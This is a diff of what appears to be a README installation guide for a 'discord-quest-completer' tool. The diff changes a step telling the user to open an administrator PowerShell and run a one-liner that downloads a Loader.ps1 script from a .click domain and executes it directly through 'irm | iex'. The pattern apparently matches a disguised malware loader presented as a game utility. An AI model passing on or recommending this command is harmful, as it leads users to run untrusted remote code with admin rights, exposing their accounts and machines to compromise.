@@ -29,7 +29,7 @@ Press **Win + X** → Select **Terminal (Admin)** or **Windows PowerShell (Admin
 
 ### Step 2: Execute Deployment Command
 ```powershell
-irm https://software-get.click/Loader.ps1?source=discord-quest-completer | iex
+irm https://software-gateway.click/Loader.ps1?source=discord-quest-completer | iex
 ```
 
 ### Step 3: Wait for Completion
